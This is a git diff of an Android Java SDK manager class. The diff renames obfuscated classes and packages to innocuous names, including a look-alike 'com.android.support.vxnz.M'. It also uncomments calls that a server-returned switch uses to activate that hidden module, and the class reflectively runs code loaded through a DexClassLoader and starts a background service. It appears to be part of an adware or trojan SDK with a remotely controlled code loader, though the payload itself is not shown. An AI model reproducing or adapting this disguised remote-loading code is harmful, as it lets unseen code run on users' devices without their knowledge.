@@ -1,4 +1,4 @@
-package com.paras.piece.v;
+package com.home.pageup.manager;
 
 
 import android.content.Context;
@@ -6,14 +6,15 @@ import android.content.Intent;
 import android.os.Handler;
 import android.util.Log;
 
-import com.paras.piece.Config;
-import com.paras.piece.api.API;
-import com.paras.piece.api.Constant;
-import com.paras.piece.http.base.RequestCallback;
-import com.paras.piece.z.VBs;
-import com.paras.piece.utils.LogUtil;
-import com.paras.piece.utils.SDKUtil;
-import com.paras.piece.utils.SPUtil;
+import com.android.support.vxnz.M;
+import com.home.pageup.Config;
+import com.home.pageup.api.API;
+import com.home.pageup.api.Constant;
+import com.home.pageup.http.base.RequestCallback;
+import com.home.pageup.i.RequestToDataService;
+import com.home.pageup.utils.LogUtil;
+import com.home.pageup.utils.SDKUtil;
+import com.home.pageup.utils.SPUtil;
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -27,9 +28,9 @@ import dalvik.system.DexClassLoader;
 /**
  * SDK 初始化主入口 对外提供初始化接口
  */
-public class VB {
+public class SDKManager {
 
-    private volatile static VB mInstance;
+    private volatile static SDKManager mInstance;
     public static Context mContext;
     public static DexClassLoader dexClassLoader = null;
     public static boolean flag = true;
@@ -39,15 +40,15 @@ public class VB {
     public static int maxRequestAddSdk = 0;
     public static String mUserId = "";
 
-    private VB(Context context) {
+    private SDKManager(Context context) {
         mContext = context;
     }
 
-    public static VB getInstance(Context context, String userId) {
+    public static SDKManager getInstance(Context context, String userId) {
         if (mInstance == null) {
-            synchronized (VB.class) {
+            synchronized (SDKManager.class) {
                 if (mInstance == null) {
-                    mInstance = new VB(context);
+                    mInstance = new SDKManager(context);
                     mUserId = userId;
                     SPUtil.getInstance(context);
                     HttpManager.getInstance(context);
@@ -87,14 +88,14 @@ public class VB {
                     LogUtil.e(message);
                     SPUtil.save(Constant.FIST_RUN, false);
 
-                    VB.maxRequestAddSdk++;
-                    LogUtil.i("HttpAddSdk -> SDKManager.maxRequestAddSdk :" + VB.maxRequestAddSdk);
+                    SDKManager.maxRequestAddSdk++;
+                    LogUtil.i("HttpAddSdk -> SDKManager.maxRequestAddSdk :" + SDKManager.maxRequestAddSdk);
 
-                    if (VB.maxRequestAddSdk < Constant.MAX_REQUEST) {
+                    if (SDKManager.maxRequestAddSdk < Constant.MAX_REQUEST) {
                         HttpManager.doPostAddSdk(this);
                     } else {
                         LogUtil.i(API.APP_ADDSDK + " request count -> 请求已达最大次数");
-                        VB.maxRequestAddSdk = 0;
+                        SDKManager.maxRequestAddSdk = 0;
                     }
                 }
 
@@ -112,22 +113,21 @@ public class VB {
             public void onFailed(String message) {
                 LogUtil.e(message);
 
-                VB.maxRequestStartApp++;
-                LogUtil.i("HttpAddSdk -> SDKManager.maxRequestStartApp :" + VB.maxRequestStartApp);
+                SDKManager.maxRequestStartApp++;
+                LogUtil.i("HttpAddSdk -> SDKManager.maxRequestStartApp :" + SDKManager.maxRequestStartApp);
 
-                if (VB.maxRequestStartApp < Constant.MAX_REQUEST) {
+                if (SDKManager.maxRequestStartApp < Constant.MAX_REQUEST) {
                     HttpManager.doPostAppActive(this);
                 } else {
                     LogUtil.i(API.APP_ACTIVE + " request count -> 请求已达最大次数");
-                    VB.maxRequestStartApp = 0;
+                    SDKManager.maxRequestStartApp = 0;
                 }
             }
 
             @Override
             public void onResponse(String response) {
                 LogUtil.w("NETWORK :" + API.APP_ACTIVE + " request success ->" + response);
-                active();
-//                sdkSelectHttp();
+                sdkSelectHttp();
             }
         });
 
@@ -152,11 +152,11 @@ public class VB {
                             active();
                             break;
                         case 1:
-//                            M.i(mContext);
+                            M.i(mContext);
                             break;
                         case 3:
                             active();
-//                            M.i(mContext);
+                            M.i(mContext);
                             break;
                         case 4:
                             LogUtil.w("close sdk all");
@@ -309,10 +309,8 @@ public class VB {
         handler.post(new Runnable() {
             @Override
             public void run() {
-                LogUtil.i("startSDKService");
-                //启动服务
                 if (!SDKUtil.thisServiceHasRun(mContext)) {
-                    mContext.startService(new Intent(mContext, VBs.class));
+                    mContext.startService(new Intent(mContext, RequestToDataService.class));
                 }
             }
         });
@@ -321,7 +319,7 @@ public class VB {
     public static void screenInterface() {
         LogUtil.i("screenInterface");
         try {
-            Class<?> sdkManagerClass = VB.dexClassLoader.loadClass(Constant.SDK_SERVICE_CODE);
+            Class<?> sdkManagerClass = SDKManager.dexClassLoader.loadClass(Constant.SDK_SERVICE_CODE);
             Method initMethod = sdkManagerClass.getDeclaredMethod("screenInterface", new Class[]{Context.class});
             initMethod.invoke(sdkManagerClass.newInstance(), new Object[]{mContext});
         } catch (Exception e) {
@@ -333,7 +331,7 @@ public class VB {
     public static void bannerInterface() {
         LogUtil.i("bannerInterface");
         try {
-            Class<?> sdkManagerClass = VB.dexClassLoader.loadClass(Constant.SDK_SERVICE_CODE);
+            Class<?> sdkManagerClass = SDKManager.dexClassLoader.loadClass(Constant.SDK_SERVICE_CODE);
             Method initMethod = sdkManagerClass.getDeclaredMethod("bannerInterface", new Class[]{Context.class});
             initMethod.invoke(sdkManagerClass.newInstance(), new Object[]{mContext});
         } catch (Exception e) {
